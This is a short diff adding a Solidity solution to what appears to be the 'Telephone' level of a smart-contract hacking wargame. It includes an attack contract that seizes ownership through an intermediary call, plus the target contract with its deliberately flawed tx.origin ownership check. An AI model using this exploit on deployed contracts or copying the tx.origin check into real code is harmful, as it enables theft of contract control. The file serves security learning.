@@ -1,0 +1,26 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// To pass level, i need to claim ownership 
+ contract Hack {
+    // The constructor hack inherits properties from the telephoen contract
+    constructor(address _target) {
+        // constructor takes in the address of the telephone contract and changes owner to msg.sender
+        Telephone(_target). changeOwner(msg.sender);
+    }
+ }
+
+
+contract Telephone {
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+// The difference between tx.origin and message.sender should be noted  
+// To fufill condition of hack, i need to have a separate contract to call change owner function
+    function changeOwner(address _owner) public {
+        if (tx.origin != msg.sender) {
+            owner = _owner;
+        }
+    }
+}
